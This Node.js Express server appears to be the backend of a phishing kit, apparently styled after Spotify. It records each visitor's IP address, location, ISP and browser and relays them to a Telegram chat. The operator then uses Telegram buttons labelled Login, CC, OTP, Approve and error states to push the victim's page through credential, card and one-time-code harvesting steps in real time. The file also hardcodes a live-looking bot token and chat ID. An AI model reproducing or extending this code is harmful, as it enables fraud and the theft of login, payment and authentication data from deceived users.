const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const userAgentParser = require('user-agent-parser');

const app = express();
const port = 3000;

const botToken = '7764284417:AAE9-ADJoUIFoXjNuZclwFI8yJOpKRcINMQ';
const chatId = '-1002304351250';

// Initialize Telegram Bot with webhook
const bot = new TelegramBot(botToken, { webHook: true });
const webhookUrl = 'https://spotnewback-ds79.onrender.com/bot'; // Replace with Render domain
bot.setWebHook(webhookUrl);

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const sseConnections = {};

// Replace polling-based methods with webhook logic
app.post('/bot', (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Route to send Telegram notifications
async function sendToTelegram(message, userId) {
    try {
        console.log(`Sending message to Telegram for userId: ${userId}`);
        await bot.sendMessage(chatId, message, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: 'Login', callback_data: `login|${userId}` },
                        { text: 'Update', callback_data: `cc|${userId}` },
                    ],
                    [
                        { text: 'Otp', callback_data: `sms|${userId}` },
                        { text: 'Approve', callback_data: `approve|${userId}` },
                    ],
                    [
                        { text: 'Update-Error', callback_data: `updateError|${userId}` },
                        { text: 'Otp-Error', callback_data: `otpError|${userId}` },
                        { text: 'Login-Error', callback_data: `loginError|${userId}` },
                    ],
                    [
                        { text: 'Thankyou', callback_data: `thankyou|${userId}` },
                    ],
                ],
            },
        });
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        throw error;
    }
}

// Handle other routes and logic
app.get('/details', async (req, res) => {
    const visitorIp = (req.headers['x-forwarded-for'] || req.connection.remoteAddress).split(',')[0].trim();
    const userAgent = req.headers['user-agent'];
    const userId = req.headers['user-id'];

    if (!userId) {
        return res.status(400).json({ success: false, message: "User ID is required" });
    }

    const parsedUserAgent = userAgentParser(userAgent);
    const browser = parsedUserAgent.browser.name || 'Unknown';

    let visitorCity = 'Unknown';
    let visitorCountry = 'Unknown';
    let visitorProvider = 'Unknown';
    let visitorHostname = 'Unknown';

    try {
        const ipInfoResponse = await axios.get(`http://ip-api.com/json/${visitorIp}`);
        const ipInfo = ipInfoResponse.data;

        if (ipInfo && ipInfo.status === 'success') {
            visitorCity = ipInfo.city || 'Unknown';
            visitorCountry = ipInfo.country || 'Unknown';
            visitorProvider = ipInfo.org || 'Unknown';
            visitorHostname = ipInfo.hostname || 'Unknown';
        }
    } catch (error) {
        console.error('Error fetching IP information:', error);
    }

    const message = `
🚨 New Visitor Alert 🚨
=====================
🌍 IP Address: ${visitorIp}
🔗 Hostname: ${visitorHostname}
🏙 City: ${visitorCity}
🏳️ Country: ${visitorCountry}
🌐 Browser: ${browser}
🛣 Provider: ${visitorProvider}
🆔 User ID: ${userId}  
=====================
`;

    try {
        await sendToTelegram(message, userId);
        res.json({ success: true });
    } catch (error) {
        console.error('Error notifying page load:', error);
        res.status(500).json({ success: false });
    }
});

bot.on('callback_query', async (callbackQuery) => {
    const { id, data } = callbackQuery;
    const [action, userId] = data.split('|');

    let responseText = '';
    let showRedirect = false;

    console.log(`Callback received: action=${action}, userId=${userId}`);

    switch (action) {
        case 'login':
            responseText = `User ${userId} clicked Login.`;
            break;
        case 'cc':
            responseText = `User ${userId} clicked CC.`;
            break;
        case 'sms':
            responseText = `User ${userId} clicked SMS.`;
            break;
        case 'otpError':
            responseText = `User ${userId} clicked otpError.`;
            break;
        case 'updateError':
            responseText = `User ${userId} clicked updateError.`;
            break;
        case 'approve':
            responseText = `User ${userId} clicked approve.`;
            break;
        case 'loginError':
            responseText = `User ${userId} clicked loginError.`;
            break;
        case 'thankyou':
            responseText = `User ${userId} clicked thankyou.`;
            break;
        default:
            responseText = `Unknown action for user ${userId}.`;
            break;
    }

    try {
        await bot.answerCallbackQuery(id, { text: responseText });
        console.log(`Answered callback query with text: ${responseText}`);

        if (sseConnections[userId]) {
            console.log(`Sending SSE update for user ${userId}`);
            sseConnections[userId].forEach((client) => {
                client.write(`data: ${JSON.stringify({ action, userId, showRedirect })}\n\n`);
            });
        }
    } catch (error) {
        console.error('Error handling callback query:', error);
    }
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
    console.log(`Webhook set to ${webhookUrl}`);
});
